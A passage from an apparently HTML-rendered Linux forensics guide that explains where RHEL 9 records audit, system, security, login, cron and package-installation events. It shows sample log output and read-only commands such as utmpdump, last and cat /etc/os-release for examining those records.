<p><code>ses=2</code>: The session ID. This is a unique identifier that Linux uses to group processes. When a user logs into a system, a new session is started, and a unique session ID is assigned to that session. All the processes that start as a result of this login, such as from executing commands or starting applications, are associated with this session ID.</p>
</li>
<li>
<p><code>comm=&quot;touch&quot;</code>: The command that was issued, in this case touch.</p>
</li>
<li>
<p><code>exe=&quot;/usr/bin/touch&quot;</code>: The executable that was run to issue the command.</p>
</li>
<li>
<p><code>key=&quot;file-create&quot;</code>: The key is an optional, searchable string that can be added to the audit log record for easier searching.</p>
</li>
</ul>
<div class="footnote-definition" id="chapters-21-02-audit_log-tenable_log"><sup class="footnote-definition-label">1</sup>
<p><a href="https://www.tenable.com/audits/items/CIS_Red_Hat_EL5_v2.2.1_L2.audit:f2b864d4b38503be899180c1d4962197">https://www.tenable.com/audits/items/CIS_Red_Hat_EL5_v2.2.1_L2.audit:f2b864d4b38503be899180c1d4962197</a></p>
</div>
<div class="footnote-definition" id="chapters-21-02-audit_log-audit_logs"><sup class="footnote-definition-label">2</sup>
<p><a href="https://www.tecmint.com/query-audit-logs-using-ausearch-tool-on-centos-rhel/">https://www.tecmint.com/query-audit-logs-using-ausearch-tool-on-centos-rhel/</a></p>
</div>
<div style="break-before: page; page-break-before: always;"></div><div id="chapters-21-03-system_messages_log"></div><h1 id="chapters-21-03-system_messages_log-system-log"><a class="header" href="#chapters-21-03-system_messages_log-system-log">System log</a></h1>
<p>The <code>messages</code> log is located in the <code>/var/log/messages</code> contains the system log. This includes startup messages, kernel messages and application messages. This is a valuable tool in forensics analysis as it can provide information about the sequence of events. </p>
<p>The file format is text and can be viewed with a <code>cat</code> command. </p>
<p><code>Startup messages</code>: These messages are generated when the system starts up. They can provide information about the hardware and software that is loaded, as well as any errors that occur during startup.
<code>Kernel messages</code>: These messages are generated by the Linux kernel. They can provide information about kernel events, such as hardware interrupts, process creation, and file access.
<code>Application messages</code>: These messages are generated by applications. They can provide information about application events, such as errors, warnings, and status messages.</p>
<div style="break-before: page; page-break-before: always;"></div><div id="chapters-21-04-security_log"></div><h1 id="chapters-21-04-security_log-security-log"><a class="header" href="#chapters-21-04-security_log-security-log">Security log</a></h1>
<p>The <code>/var/log/secure</code> file logs all security-related events dealing with authorization or authentication. For example, whenever someone logs into the system, switches users with <code>su</code>, or makes <code>sudo</code> command use, a log entry is generated and stored in <code>/var/log/secure</code>.</p>
<p>Other events include authentication attempts, SSH logins, SELinux denials, and other security-related events.</p>
<p>Here are examples of various activities that you might find in <code>secure</code> that is relevant for a forensic investigation. </p>
<ul>
<li><code>User Creation</code>: When a new user is added to the system, it's logged. The <code>useradd</code> command logs information about the new user, including the username, UID, GID, home directory, and shell.</li>
</ul>
<pre><code class="language-bash">Jul  7 00:55:34 rhel-richmondfc useradd[48265]: new group: name=keeley, GID=1002
Jul  7 00:55:34 rhel-richmondfc useradd[48265]: new user: name=keeley, UID=1001, GID=1002, home=/home/keeley, shell=/bin/bash, from=/dev/pts/0
</code></pre>
<ul>
<li><code>Password Change</code>: When a user's password is changed using the <code>passwd</code> command.</li>
</ul>
<pre><code class="language-bash">Jul  7 00:57:44 rhel-richmondfc passwd[48311]: pam_unix(passwd:chauthtok): password changed for keeley
</code></pre>
<ul>
<li><code>User Deletion</code>: When a user is deleted from the system, the <code>userdel</code> command logs the event.</li>
</ul>
<pre><code class="language-bash">Jul  7 00:58:09 rhel-richmondfc userdel[48328]: delete user 'keeley'
Jul  7 00:58:09 rhel-richmondfc userdel[48328]: removed group 'keeley' owned by 'keeley'
Jul  7 00:58:09 rhel-richmondfc userdel[48328]: removed shadow group 'keeley' owned by 'keeley'
</code></pre>
<ul>
<li><code>sudo</code> command usage: Any command executed using <code>sudo</code> will be logged, including the user who ran the command and the command itself. </li>
</ul>
<pre><code class="language-bash">Jul  7 00:57:44 rhel-richmondfc sudo[48309]: pam_unix(sudo:session): session closed for user root
Jul  7 00:58:09 rhel-richmondfc sudo[48326]:  tlasso : TTY=pts/0 ; PWD=/var/log ; USER=root ; COMMAND=/sbin/userdel keeley
Jul  7 00:58:09 rhel-richmondfc sudo[48326]: pam_unix(sudo:session): session opened for user root(uid=0) by (uid=1000)
Jul  7 00:58:09 rhel-richmondfc userdel[48328]: delete user 'keeley'
Jul  7 00:58:09 rhel-richmondfc userdel[48328]: removed group 'keeley' owned by 'keeley'
Jul  7 00:58:09 rhel-richmondfc userdel[48328]: removed shadow group 'keeley' owned by 'keeley'
Jul  7 00:58:09 rhel-richmondfc sudo[48326]: pam_unix(sudo:session): session closed for user root
</code></pre>
<p>In the above example a sudo user session is established and the delete command is issued by the user. </p>
<p>A summay of the various daemons writing to the security log file can be created using the following. </p>
<pre><code class="language-bash">sudo cat secure* | awk '{print $5}' | sed 's/\[[^]]*\]//' | sort | uniq
</code></pre>
<pre><code class="language-bash">[tlasso@rhel-richmondfc log]$ sudo cat secure* | awk '{print $5}' | sed 's/\[[^]]*\]//' | sort | uniq
atd:
gdm-launch-environment:
gdm-password:
passwd:
pkexec:
polkitd:
sshd:
sssctl:
su:
sudo:
systemd:
unix_chkpwd:
useradd:
userdel:
usermod:
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><div id="chapters-21-03-logon_attempts"></div><h1 id="chapters-21-03-logon_attempts-logon-attempts"><a class="header" href="#chapters-21-03-logon_attempts-logon-attempts">Logon Attempts</a></h1>
<h2 id="chapters-21-03-logon_attempts-successful-logons"><a class="header" href="#chapters-21-03-logon_attempts-successful-logons">Successful Logons</a></h2>
<p>The <code>wtmp</code> file is a binary file that contains a history of all logins and logouts *nix system. It is located in the <code>/var/log</code> directory <sup class="footnote-reference"><a href="#chapters-21-03-logon_attempts-utmp_det">1</a></sup><sup class="footnote-reference"><a href="#chapters-21-03-logon_attempts-logg">2</a></sup>.</p>
<p>The <code>wtmp</code> file is updated by the login program whenever a user logs in or out of the system.</p>
<p>The <code>wtmp</code> file contains records that are stored in a sequential manner, with each record having a fixed size of 384 bytes. The structure of these records is defined in the <code>utmp.h</code> header file in the format of the struct <code>utmp</code> structure.</p>
<p>Here's a general idea of how the struct utmp structure looks like <sup class="footnote-reference"><a href="#chapters-21-03-logon_attempts-utmp_struct">3</a></sup>:</p>
<ul>
<li><code>ut_type</code>: The type of login event. It could indicate a user process, system boot, run-level, init process, login process, or a dead process, among others.</li>
<li><code>ut_pid</code>: The process ID associated with the session. This could be the ID of the login process.</li>
<li><code>ut_line</code>: The device name, including the tty or pseudo-tty associated with the user login, typically recorded in the /dev/ directory.</li>
<li><code>ut_id</code>: The terminal identifier, often a representation of the TTY associated with the login.</li>
<li><code>ut_user</code>: The username associated with the login event.</li>
<li><code>ut_host</code>: If a user is logging in from a remote host, this field records the hostname of that remote machine. If the system is changing run levels, this field records the new kernel version.</li>
<li><code>ut_exit</code>: This structure records the exit status of processes.</li>
<li><code>ut_session</code>: This represents the session ID and can be used to correlate records that belong to the same session.</li>
<li><code>ut_tv</code>: This structure records the time the entry was made in seconds (tv_sec) and microseconds (tv_usec).</li>
<li><code>ut_addr_v6</code>: This is an array representing the IP address of the remote host. For IPv4 addresses, only ut_addr_v6[0] is used.</li>
<li><code>__glibc_reserved</code>: This field is reserved for future use.</li>
</ul>
<h3 id="chapters-21-03-logon_attempts-utmpdump-utility"><a class="header" href="#chapters-21-03-logon_attempts-utmpdump-utility"><code>utmpdump</code> utility</a></h3>
<p>The <code>utmpdump</code> utility is a command-line tool that can be used to dump the contents of <code>wtmp</code> in a human-readable format.</p>
<pre><code class="language-bash">sudo utmpdump wtmp
</code></pre>
<pre><code class="language-bash">[tlasso@rhel-richmondfc log]$ sudo utmpdump wtmp 
Utmp dump of wtmp
[2] [00000] [~~  ] [reboot  ] [~           ] [5.14.0-284.11.1.el9_2.x86_64] [0.0.0.0        ] [2023-06-14T06:33:26,391250+00:00]
[1] [00053] [~~  ] [runlevel] [~           ] [5.14.0-284.11.1.el9_2.x86_64] [0.0.0.0        ] [2023-06-14T06:33:40,819556+00:00]
[7] [05403] [    ] [tlasso  ] [seat0       ] [login screen        ] [0.0.0.0        ] [2023-06-14T06:35:06,827950+00:00]
[7] [05403] [    ] [tlasso  ] [tty2        ] [tty2                ] [0.0.0.0        ] [2023-06-14T06:35:06,842674+00:00]
...
[7] [02252] [    ] [tlasso  ] [tty2        ] [tty2                ] [0.0.0.0        ] [2023-06-14T07:08:32,732126+00:00]
[8] [02252] [    ] [        ] [tty2        ] [tty2                ] [0.0.0.0        ] [2023-06-14T07:10:32,561013+00:00]
[7] [03822] [    ] [corp\tlasso] [seat0       ] [login screen        ] [0.0.0.0        ] [2023-06-14T07:11:59,828610+00:00]
[7] [03822] [    ] [corp\tlasso] [tty2        ] [tty2                ] [0.0.0.0        ] [2023-06-14T07:11:59,844923+00:00]
[8] [03822] [    ] [        ] [tty2        ] [tty2                ] [0.0.0.0        ] [2023-06-14T07:14:12,532661+00:00]
[7] [05218] [    ] [tlasso  ] [seat0       ] [login screen        ] [0.0.0.0        ] [2023-06-14T07:16:25,340760+00:00]
[7] [05218] [    ] [tlasso  ] [tty2        ] [tty2                ] [0.0.0.0        ] [2023-06-14T07:16:25,355669+00:00]
[7] [07149] [    ] [corp\tlasso] [seat0       ] [login screen        ] [0.0.0.0        ] [2023-06-14T07:20:19,453351+00:00]
[7] [07149] [    ] [corp\tlasso] [tty3        ] [tty3                ] [0.0.0.0        ] [2023-06-14T07:20:19,468732+00:00]
[8] [07149] [    ] [        ] [tty3        ] [tty3                ] [0.0.0.0        ] [2023-06-14T07:20:49,888562+00:00]
[7] [08634] [    ] [corp\nate] [seat0       ] [login screen        ] [0.0.0.0        ] [2023-06-14T07:21:01,919825+00:00]
[7] [08634] [    ] [corp\nate] [tty3        ] [tty3                ] [0.0.0.0        ] [2023-06-14T07:21:01,934843+00:00]
[8] [05218] [    ] [        ] [tty2        ] [tty2                ] [0.0.0.0        ] [2023-06-14T07:23:00,060946+00:00]
[1] [00000] [~~  ] [shutdown] [~           ] [5.14.0-284.11.1.el9_2.x86_64] [0.0.0.0        ] [2023-06-14T07:23:11,496730+00:00]
[2] [00000] [~~  ] [reboot  ] [~           ] [5.14.0-284.11.1.el9_2.x86_64] [0.0.0.0        ] [2023-06-14T07:23:19,033360+00:00]
[1] [00053] [~~  ] [runlevel] [~           ] [5.14.0-284.11.1.el9_2.x86_64] [0.0.0.0        ] [2023-06-14T07:23:32,171343+00:00]
...
[7] [02262] [    ] [corp\cbeard] [seat0       ] [login screen        ] [0.0.0.0        ] [2023-07-02T14:52:43,715647+00:00]
[7] [02262] [    ] [corp\cbeard] [tty2        ] [tty2                ] [0.0.0.0        ] [2023-07-02T14:52:43,730818+00:00]
[7] [05197] [    ] [tlasso  ] [seat0       ] [login screen        ] [0.0.0.0        ] [2023-07-02T15:39:28,794506+00:00]
[7] [05197] [    ] [tlasso  ] [tty3        ] [tty3                ] [0.0.0.0        ] [2023-07-02T15:39:28,810540+00:00]
[7] [07492] [    ] [cbeard@corp.tuxtriage.net] [seat0       ] [login screen        ] [0.0.0.0        ] [2023-07-02T15:59:58,261848+00:00]
[7] [07492] [    ] [cbeard@corp.tuxtriage.net] [tty4        ] [tty4                ] [0.0.0.0        ] [2023-07-02T15:59:58,270203+00:00]
[1] [00000] [~~  ] [shutdown] [~           ] [5.14.0-284.11.1.el9_2.x86_64] [0.0.0.0        ] [2023-07-02T16:01:53,787611+00:00]
[2] [00000] [~~  ] [reboot  ] [~           ] [5.14.0-284.11.1.el9_2.x86_64] [0.0.0.0        ] [2023-07-02T16:02:11,368171+00:00]
[1] [00053] [~~  ] [runlevel] [~           ] [5.14.0-284.11.1.el9_2.x86_64] [0.0.0.0        ] [2023-07-02T16:02:14,822723+00:00]
[7] [02261] [    ] [corp\cbeard] [seat0       ] [login screen        ] [0.0.0.0        ] [2023-07-02T16:02:37,388535+00:00]
[7] [02261] [    ] [corp\cbeard] [tty2        ] [tty2                ] [0.0.0.0        ] [2023-07-02T16:02:37,404458+00:00]
[8] [02261] [    ] [        ] [tty2        ] [tty2                ] [0.0.0.0        ] [2023-07-02T16:04:27,464002+00:00]
[7] [04014] [    ] [tlasso  ] [seat0       ] [login screen        ] [0.0.0.0        ] [2023-07-02T16:04:40,193039+00:00]
[7] [04014] [    ] [tlasso  ] [tty2        ] [tty2                ] [0.0.0.0        ] [2023-07-02T16:04:40,208590+00:00]
[7] [06612] [ts/1] [nate@corp.tuxtriage.net] [pts/1       ] [172.26.0.1          ] [172.26.0.1     ] [2023-07-02T18:36:35,071518+00:00]
...
[7] [37619] [    ] [corp\cbeard] [seat0       ] [login screen        ] [0.0.0.0        ] [2023-07-05T17:51:14,138272+00:00]
[7] [37619] [    ] [corp\cbeard] [tty2        ] [tty2                ] [0.0.0.0        ] [2023-07-05T17:51:14,152081+00:00]
[7] [39323] [    ] [tlasso  ] [seat0       ] [login screen        ] [0.0.0.0        ] [2023-07-05T17:52:15,720396+00:00]
[7] [39323] [    ] [tlasso  ] [tty3        ] [tty3                ] [0.0.0.0        ] [2023-07-05T17:52:15,736486+00:00]
[7] [40243] [ts/1] [nate@corp.tuxtriage.net] [pts/1       ] [172.23.48.1         ] [172.23.48.1    ] [2023-07-05T17:54:25,140715+00:00]

</code></pre>
<h3 id="chapters-21-03-logon_attempts-last-command-utility"><a class="header" href="#chapters-21-03-logon_attempts-last-command-utility"><code>last</code> command utility</a></h3>
<p>The <code>last</code> command is a utility can also be used to view this information. The list is produced in reverse chronological order (most recent events first), hence the name &quot;last&quot;.</p>
<pre><code class="language-bash">sudo last -f btmp
</code></pre>
<pre><code class="language-bash">[tlasso@rhel-richmondfc log]$ last -f wtmp 
nate@cor pts/1        172.23.48.1      Wed Jul  5 13:54   still logged in
tlasso   tty3         tty3             Wed Jul  5 13:52   still logged in
tlasso   seat0        login screen     Wed Jul  5 13:52   still logged in
corp\cbe tty2         tty2             Wed Jul  5 13:51   still logged in
corp\cbe seat0        login screen     Wed Jul  5 13:51 - 13:52  (00:01)
tlasso   tty2         tty2             Wed Jul  5 13:29 - 13:50  (00:21)
tlasso   seat0        login screen     Wed Jul  5 13:29 - 13:51  (00:22)
reboot   system boot  5.14.0-284.18.1. Wed Jul  5 13:27   still running
reboot   system boot  5.14.0-284.11.1. Wed Jul  5 13:20 - 13:22  (00:01)
tlasso   tty2         tty2             Mon Jul  3 19:09 - down  (1+18:11)
tlasso   seat0        login screen     Mon Jul  3 19:09 - down  (1+18:11)
reboot   system boot  5.14.0-284.11.1. Sun Jul  2 23:44 - 13:20 (2+13:36)
nate@cor pts/1        172.26.0.1       Sun Jul  2 14:36 - crash  (09:07)
tlasso   tty2         tty2             Sun Jul  2 12:04 - crash  (11:39)
tlasso   seat0        login screen     Sun Jul  2 12:04 - crash  (11:39)
</code></pre>
<h2 id="chapters-21-03-logon_attempts-failed-logon-attempts"><a class="header" href="#chapters-21-03-logon_attempts-failed-logon-attempts">Failed Logon Attempts</a></h2>
<p>The <code>btmp</code> file is a system log file in Linux that keeps a record of failed login attempts. It is located in the <code>/var/log/</code> directory.</p>
<p>Each time a user or process tries to log in to the system and fails, an entry is added to the <code>btmp</code> file. This file can be quite useful from a security perspective because a large number of failed login attempts could be an indication of a brute force attack or some other malicious activity.</p>
<p>The <code>btmp</code> file also uses a binary format to store login records. Each record is stored as a struct <code>utmp</code>. The <code>utmpdump</code> and <code>last</code> commands can be used to view the data. </p>
<pre><code class="language-bash">sudo last -f btmp
</code></pre>
<pre><code class="language-bash">[tlasso@rhel-richmondfc log]$ sudo last -f btmp
CORPcbe seat0        login screen     Sun Jul  2 09:04    gone - no logout
cbeard@t seat0        login screen     Sun Jul  2 09:04 - 09:04  (00:00)
corpcbe seat0        login screen     Sun Jul  2 09:03 - 09:04  (00:00)
cbeard   seat0        login screen     Sun Jul  2 09:03 - 09:03  (00:00)
cbeard   seat0        login screen     Sun Jul  2 09:02 - 09:03  (00:00)
cbeard   seat0        login screen     Sun Jul  2 09:02 - 09:02  (00:00)
cbeard   seat0        login screen     Sun Jul  2 09:02 - 09:02  (00:00)

btmp begins Sun Jul  2 09:02:27 2023

[tlasso@rhel-richmondfc log]$ sudo last -f btmp-20230702 
tuxtriag seat0        login screen     Wed Jun 14 03:11    gone - no logout
tuxtriag seat0        login screen     Wed Jun 14 03:10 - 03:11  (00:00)
tlasso   seat0        login screen     Wed Jun 14 02:34 - 03:10  (00:35)

btmp-20230702 begins Wed Jun 14 02:34:55 2023
</code></pre>
<pre><code class="language-bash">[tlasso@rhel-richmondfc log]$ sudo utmpdump btmp
Utmp dump of btmp
[7] [04306] [    ] [cbeard  ] [seat0       ] [login screen        ] [0.0.0.0        ] [2023-07-02T13:02:27,697928+00:00]
[7] [04331] [    ] [cbeard  ] [seat0       ] [login screen        ] [0.0.0.0        ] [2023-07-02T13:02:36,386695+00:00]
[7] [04337] [    ] [cbeard  ] [seat0       ] [login screen        ] [0.0.0.0        ] [2023-07-02T13:02:44,039468+00:00]
[7] [04350] [    ] [cbeard  ] [seat0       ] [login screen        ] [0.0.0.0        ] [2023-07-02T13:03:09,359408+00:00]
[7] [04370] [    ] [corp\cbeard] [seat0       ] [login screen        ] [0.0.0.0        ] [2023-07-02T13:03:59,445274+00:00]
[7] [04380] [    ] [cbeard@tuxtriage.net] [seat0       ] [login screen        ] [0.0.0.0        ] [2023-07-02T13:04:30,283273+00:00]
[7] [04389] [    ] [CORP\cbeard] [seat0       ] [login screen        ] [0.0.0.0        ] [2023-07-02T13:04:57,104620+00:00]
[6] [36824] [    ] [jayaram ] [ssh:notty   ] [172.23.48.1         ] [172.23.48.1    ] [2023-07-05T17:46:34,000000+00:00]
[6] [36824] [    ] [jayaram ] [ssh:notty   ] [172.23.48.1         ] [172.23.48.1    ] [2023-07-05T17:46:50,000000+00:00]
[6] [37042] [    ] [corpnate] [ssh:notty   ] [172.23.48.1         ] [172.23.48.1    ] [2023-07-05T17:50:17,000000+00:00]
[6] [37042] [    ] [corpnate] [ssh:notty   ] [172.23.48.1         ] [172.23.48.1    ] [2023-07-05T17:50:23,000000+00:00]
[6] [37044] [    ] [corp    ] [ssh:notty   ] [172.23.48.1         ] [172.23.48.1    ] [2023-07-05T17:50:32,000000+00:00]
[6] [37044] [    ] [corp    ] [ssh:notty   ] [172.23.48.1         ] [172.23.48.1    ] [2023-07-05T17:50:38,000000+00:00]
</code></pre>
<div class="footnote-definition" id="chapters-21-03-logon_attempts-utmp_man"><sup class="footnote-definition-label">4</sup>
<p><a href="https://man7.org/linux/man-pages/man5/utmp.5.html">https://man7.org/linux/man-pages/man5/utmp.5.html</a>
<sup class="footnote-reference"><a href="#chapters-21-03-logon_attempts-utmpdump">5</a></sup>: <a href="https://man7.org/linux/man-pages/man1/utmpdump.1.html">https://man7.org/linux/man-pages/man1/utmpdump.1.html</a>
<sup class="footnote-reference"><a href="#chapters-21-03-logon_attempts-utmp_det">1</a></sup>: <a href="https://www.linuxnix.com/read-view-utmp-wtmp-btmp-file-linuxunix/">https://www.linuxnix.com/read-view-utmp-wtmp-btmp-file-linuxunix/</a>
<sup class="footnote-reference"><a href="#chapters-21-03-logon_attempts-logg">2</a></sup>: <a href="https://www.cs.clemson.edu/course/cpsc424/material/Logging/utmp.pdf">https://www.cs.clemson.edu/course/cpsc424/material/Logging/utmp.pdf</a>
<sup class="footnote-reference"><a href="#chapters-21-03-logon_attempts-utmpdumpc">6</a></sup>: <a href="https://github.com/util-linux/util-linux/blob/master/login-utils/utmpdump.c">https://github.com/util-linux/util-linux/blob/master/login-utils/utmpdump.c</a>
<sup class="footnote-reference"><a href="#chapters-21-03-logon_attempts-utmp_struct">3</a></sup>: <a href="https://elixir.bootlin.com/glibc/glibc-2.34/source/bits/utmp.h#L58">https://elixir.bootlin.com/glibc/glibc-2.34/source/bits/utmp.h#L58</a></p>
</div>
<div style="break-before: page; page-break-before: always;"></div><div id="chapters-21-04-scheduled_task_exe"></div><h1 id="chapters-21-04-scheduled_task_exe-scheduled-task-execution"><a class="header" href="#chapters-21-04-scheduled_task_exe-scheduled-task-execution">Scheduled task execution</a></h1>
<p>The <code>cron</code> log file, located at <code>/var/log/cron</code>, is where the cron daemon logs its activities. It provides valuable information about all the cron jobs executed on the system. </p>
<p>Each entry in the <code>cron</code> log file is a line of text that includes several pieces of information. A typical entry may look something like this:</p>
<pre><code class="language-bash">Jul  4 01:01:01 rhel-richmondfc run-parts[7909]: (/etc/cron.hourly) starting 0anacron
Jul  4 01:01:01 rhel-richmondfc anacron[7922]: Anacron started on 2023-07-04
Jul  4 01:01:01 rhel-richmondfc anacron[7922]: Normal exit (0 jobs run)
Jul  4 01:01:01 rhel-richmondfc run-parts[7909]: (/etc/cron.hourly) finished 0anacron
Jul  4 01:01:01 rhel-richmondfc CROND[7908]: (root) CMDEND (run-parts /etc/cron.hourly)
Jul  4 01:41:10 rhel-richmondfc atd[8497]: Starting job 2 (a0000201ad6515) for user 'tlasso' (1000)

</code></pre>
<p>This log line can be broken down into the following parts:</p>
<ul>
<li><code>timestamp</code>: The timestamp when the cron job was executed.</li>
<li><code>hostname</code>: The hostname of the system where the cron job was run.</li>
<li><code>Cron Deamon[Process Id]</code>: The name of the cron daemon (CROND, anacron, atd, run-parts etc) and the process ID (PID) of the cron job inside the square brackets.</li>
</ul>
<p>The text parts after the <code>:</code> depends on the daemon. </p>
<p>The <code>cron </code> daemon has the following details.</p>
<ul>
<li>
<p><code>(root)</code>: This signifies that the user who owns the cron job is root.</p>
</li>
<li>
<p><code>CMDEND (run-parts /etc/cron.hourly)</code>: The CMDEND part indicates that the execution of a specific command has ended. In this case, the command is run-parts <code>/etc/cron.hourly</code>, which is a standard way of running all scripts in the <code>/etc/cron.hourly</code> directory on an hourly basis.</p>
</li>
</ul>
<p>The <code>atd</code> daemon has the following details.</p>
<ul>
<li>
<p><code>Starting job 2 (a0000201ad6515)</code>: This indicates that a job was started. The number 2 is a local identification number for the job, and <code>a0000201ad6515</code> is the unique identifier for the job.</p>
</li>
<li>
<p><code>for user 'tlasso' (1000)</code>: This indicates the username and user ID of the user who scheduled the job. In this case, the user is <code>tlasso</code> and the user ID is <code>1000</code>.</p>
</li>
</ul>
<p>The <code>run-parts</code> utility has the following details.</p>
<ul>
<li>
<p><code>(/etc/cron.hourly)</code>: This is the directory whose scripts were run by run-parts. In this case, it's the <code>/etc/cron.hourly</code> directory, indicating these are tasks scheduled to run on an hourly basis.</p>
</li>
<li>
<p><code>starting 0anacron</code>: This indicates the specific script that's being started. In this case, it's the 0anacron script. The &quot;0&quot; prefix is often used in script names to control the order in which they're run, since run-parts runs scripts in lexicographic order.</p>
</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><div id="chapters-21-05-installed_apps"></div><h1 id="chapters-21-05-installed_apps-installed-applications"><a class="header" href="#chapters-21-05-installed_apps-installed-applications">Installed applications</a></h1>
<h2 id="chapters-21-05-installed_apps-dnf-logs-1"><a class="header" href="#chapters-21-05-installed_apps-dnf-logs-1">DNF Logs <sup class="footnote-reference"><a href="#chapters-21-05-installed_apps-dnf_log">1</a></sup></a></h2>
<p>The DNF log files on a RHEL provide a historical record of package management activities performed with the DNF package manager. They are located in the <code>/var/log/</code> directory. Here are some of the key log files:</p>
<ul>
<li>
<p><code>dnf.log</code>: This is the main log file, where DNF logs all transactions (package installations, updates, and removals). It includes details about the command executed, packages affected, and the date and time of the transaction.</p>
</li>
<li>
<p><code>dnf.librepo.log</code>: This log file includes detailed messages from the librepo library, which DNF uses to download RPM packages from repositories. It contains information about the download process for each package, including the URLs used and the download speeds. </p>
</li>
<li>
<p><code>dnf.rpm.log</code>: This is the most interesting for forensic examination. This log file includes messages from RPM (the underlying package manager that DNF uses to install, update and remove packages). The entries in this file correspond to the actions that RPM performs on individual packages during a DNF transaction.</p>
</li>
<li>
<p><code>dnf.plugin.log</code>: This file contains logs from DNF plugins. DNF has a plugin system that extends its functionality, and plugins can write their own log messages.</p>
</li>
</ul>
<h2 id="chapters-21-05-installed_apps-anaconda-logs-2"><a class="header" href="#chapters-21-05-installed_apps-anaconda-logs-2">Anaconda logs <sup class="footnote-reference"><a href="#chapters-21-05-installed_apps-anaconda_logs">2</a></sup></a></h2>
<p>Anaconda is the installer program used by RHEL as well as several Linux distributions in the Red Hat ecosystem. The logs generated by the Anaconda installer can provide insight into the initial setup and configuration of a system, including </p>
<ul>
<li>Details about partitiion layouts</li>
<li>Packages that were installed </li>
<li>Network initialization </li>
<li>Kernel messages </li>
<li>calls to external programs </li>
</ul>
<p>The following log files track the above information. </p>
<ul>
<li><code>/var/log/anaconda/anaconda.log</code>: General installation information </li>
<li><code>/var/log/anaconda/program.log</code>: External program calls and output</li>
<li><code>/var/log/anaconda/storage.log</code>: Storeage device scan, partitioning etc. </li>
<li><code>/var/log/anaconda/packaging.log</code>: Packages installed at system installation. </li>
</ul>
<p>The <code>package.log</code> file can provide a baseline of what software was initially installed on the system. This can be used to compare with the current state of the system to identify any additional packages that were installed or removed.</p>
<h4 id="chapters-21-05-installed_apps-sample-log-output-from-packaginglog"><a class="header" href="#chapters-21-05-installed_apps-sample-log-output-from-packaginglog">Sample log output from <code>packaging.log</code></a></h4>
<pre><code class="language-bash">02:27:32,420 INF packaging: Installed: gspell-1.9.1-3.el9.x86_64 1628556777 2c775e0b07438c046ab708eda8bf3da4d11d6b8d366b2068f7caf6a3a3c381a8
02:27:32,444 INF packaging: Installed: evince-libs-40.5-2.el9.x86_64 1653385936 2c88010f0d4aff5be78b1c785bd9a3a0f2eab41f58f5140ee551660c8b8a4ea8
02:27:32,461 INF packaging: Installed: libgnomekbd-3.26.1-7.el9.x86_64 1628568220 9eaac4d5ba9a475fca34ea14903854bd3a8c2730d84098123d694b99a6903dc4
02:27:32,496 INF packaging: Installed: libpeas-gtk-1.30.0-4.el9.x86_64 1628573987 7e943d7a11e66487fbcba66aebc3332e0873d2aa1ddf08c5d1795377987a7b76
02:27:32,502 INF packaging: Installed: nautilus-extensions-40.2-11.el9.x86_64 1677145377 508247a767c7146dd5c01bd3278ddd2a6ff428af00419fd7d0e9ca5e04f164cf
02:27:32,508 INF packaging: Installed: clutter-gst3-3.0.27-7.el9.x86_64 1628541416 9ad2024221179e726f0c7ba0440c79b3371137edf98c1e28e1edf081d631a0e6
02:27:32,516 INF packaging: Installed: cheese-libs-2:3.38.0-6.el9.x86_64 1628540134 c5232a3cc4e0629cc35ad80f187109081b5d9a29b18c7188702237c9be010bb7

</code></pre>
<div class="footnote-definition" id="chapters-21-05-installed_apps-dnf_log"><sup class="footnote-definition-label">1</sup>
<p><a href="https://utcc.utoronto.ca/~cks/space/blog/linux/DNFLogsWhatWhere">https://utcc.utoronto.ca/~cks/space/blog/linux/DNFLogsWhatWhere</a></p>
</div>
<div class="footnote-definition" id="chapters-21-05-installed_apps-anaconda_logs"><sup class="footnote-definition-label">2</sup>
<p><a href="https://docs.fedoraproject.org/en-US/quick-docs/anaconda/anaconda/">https://docs.fedoraproject.org/en-US/quick-docs/anaconda/anaconda/</a></p>
</div>
<div style="break-before: page; page-break-before: always;"></div><div id="chapters-22-config"></div><h1 id="chapters-22-config-system-configuration"><a class="header" href="#chapters-22-config-system-configuration">System Configuration</a></h1>
<h1 id="chapters-22-config-basic-system-information"><a class="header" href="#chapters-22-config-basic-system-information">Basic System Information</a></h1>
<h2 id="chapters-22-config-linux-version-information"><a class="header" href="#chapters-22-config-linux-version-information">Linux Version information</a></h2>
<pre><code class="language-bash">  cat /proc/version
</code></pre>
<pre><code class="language-bash">[tlasso@rhel-richmondfc proc]$ cat /proc/version
Linux version 5.14.0-284.18.1.el9_2.x86_64 (mockbuild@x86-64-02.build.eng.rdu2.redhat.com) (gcc (GCC) 11.3.1 20221121 (Red Hat 11.3.1-4), GNU ld version 2.35.2-37.el9) #1 SMP PREEMPT_DYNAMIC Wed May 31 10:39:18 EDT 2023
</code></pre>
<h2 id="chapters-22-config-os-release-information-from-etcos-release-file"><a class="header" href="#chapters-22-config-os-release-information-from-etcos-release-file">Os Release information from <code>/etc/os-release</code> file</a></h2>
<pre><code class="language-bash"> cat /etc/os-release
</code></pre>
<pre><code class="language-bash">tlasso@rhel-richmondfc Documents]$ cat /etc/os-release 
NAME=&quot;Red Hat Enterprise Linux&quot;
VERSION=&quot;9.2 (Plow)&quot;
ID=&quot;rhel&quot;
ID_LIKE=&quot;fedora&quot;
VERSION_ID=&quot;9.2&quot;
PLATFORM_ID=&quot;platform:el9&quot;
PRETTY_NAME=&quot;Red Hat Enterprise Linux 9.2 (Plow)&quot;
ANSI_COLOR=&quot;0;31&quot;
LOGO=&quot;fedora-logo-icon&quot;
CPE_NAME=&quot;cpe:/o:redhat:enterprise_linux:9::baseos&quot;
HOME_URL=&quot;https://www.redhat.com/&quot;
DOCUMENTATION_URL=&quot;https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/9&quot;
BUG_REPORT_URL=&quot;https://bugzilla.redhat.com/&quot;

REDHAT_BUGZILLA_PRODUCT=&quot;Red Hat Enterprise Linux 9&quot;
REDHAT_BUGZILLA_PRODUCT_VERSION=9.2
REDHAT_SUPPORT_PRODUCT=&quot;Red Hat Enterprise Linux&quot;
REDHAT_SUPPORT_PRODUCT_VERSION=&quot;9.2&quot;
</code></pre>
<h2 id="chapters-22-config-installation-date"><a class="header" href="#chapters-22-config-installation-date">Installation date</a></h2>
<pre><code class="language-bash">$ rpm -qi basesystem 
</code></pre>
<pre><code class="language-bash">[tlasso@rhel-richmondfc Documents]$ rpm -qi basesystem 
Name        : basesystem
Version     : 11
Release     : 13.el9
Architecture: noarch
Install Date: Wed 14 Jun 2023 02:26:33 AM EDT
Group       : Unspecified
Size        : 0
License     : Public Domain
